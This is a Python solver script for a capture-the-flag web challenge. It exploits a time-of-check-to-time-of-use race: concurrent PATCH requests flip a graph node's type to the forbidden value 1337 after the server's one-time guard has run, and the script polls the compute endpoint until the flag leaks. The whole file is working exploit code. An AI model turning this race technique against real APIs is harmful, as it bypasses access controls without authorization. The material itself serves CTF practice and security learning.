#!/usr/bin/env python3
"""
compuuuter (web) solver -- TOCTOU race.

compute() runs guard(nodes) (rejects type 1337) once at the start, then evaluates
nodes live, reading node["type"] at evaluation time. PATCH edits nodes in place
without the guard. So: keep the flag node last in a big graph (long evaluation
window), toggle its type between 1 and 1337 from another thread, and call compute
until the flag node is evaluated while its type is 1337.

HTTP is done via curl.exe (python's TLS bundle rejects the instance certificate here).
Endpoint is taken from env INST_ENDPOINT (fetched from /api/users/profile).
"""
import json
import os
import subprocess
import tempfile
import threading
import time

BASE = os.environ.get("INST_ENDPOINT", "").rstrip("/")
N_NODES = 20000
FLAG_ID = N_NODES          # evaluated last in compute()
TMP = tempfile.mkdtemp(prefix="compuuuter_")
found = threading.Event()
flag_value = {}
stop = threading.Event()


def curl(args):
    r = subprocess.run(["curl.exe", "-s", "--max-time", "30"] + args,
                       capture_output=True, text=True)
    return r.stdout


def write_json(name, obj):
    path = os.path.join(TMP, name)
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(obj, fh)
    return path


def upload_graph():
    nodes = [{"id": i, "type": 1, "args": [], "value": 0} for i in range(1, N_NODES + 1)]
    path = write_json("graph.json", {"nodes": nodes})
    out = curl(["-X", "POST", "-H", "Content-Type: application/json",
                "--data-binary", "@" + path, f"{BASE}/api/graph"])
    return json.loads(out)["id"]


def patch_type(gid, ntype, p_on, p_off):
    path = p_on if ntype == 1337 else p_off
    curl(["-X", "PATCH", "-H", "Content-Type: application/json",
          "--data-binary", "@" + path, f"{BASE}/api/graph/{gid}"])


def toggler(gid, p_on, p_off):
    while not stop.is_set():
        patch_type(gid, 1337, p_on, p_off)
        patch_type(gid, 1, p_on, p_off)


def computer(gid, idx):
    url = f"{BASE}/api/graph/{gid}/compute"
    attempts = 0
    while not stop.is_set():
        attempts += 1
        out = curl(["-X", "POST", url])
        try:
            data = json.loads(out)
        except ValueError:
            continue
        res = data.get("results") if isinstance(data, dict) else None
        if not res:
            continue
        val = res.get(str(FLAG_ID))
        if val is None:
            continue
        n = int(val)
        if n > 0:
            raw = n.to_bytes((n.bit_length() + 7) // 8, "little")
            text = raw.decode("latin-1", errors="replace")
            if "ctfcup{" in text:
                flag_value["flag"] = text.split("\x00")[0].strip()
                print(f"[computer {idx}] attempts={attempts}")
                found.set()
                stop.set()
                return


def main():
    if not BASE:
        raise SystemExit("set INST_ENDPOINT env var")
    print(f"[*] target {BASE}")
    gid = upload_graph()
    print(f"[*] graph {gid} with {N_NODES} nodes; flag node id={FLAG_ID}")
    p_on = write_json("patch_1337.json", {"id": FLAG_ID, "type": 1337, "args": []})
    p_off = write_json("patch_1.json", {"id": FLAG_ID, "type": 1, "args": [], "value": 0})

    threads = [threading.Thread(target=toggler, args=(gid, p_on, p_off), daemon=True)]
    threads += [threading.Thread(target=computer, args=(gid, i), daemon=True) for i in range(2)]
    for t in threads:
        t.start()

    deadline = time.time() + 300
    while not found.is_set() and time.time() < deadline:
        time.sleep(0.5)
    stop.set()
    if "flag" in flag_value:
        print("[+] FLAG:", flag_value["flag"])
    else:
        print("[-] no flag within timeout")


if __name__ == "__main__":
    main()
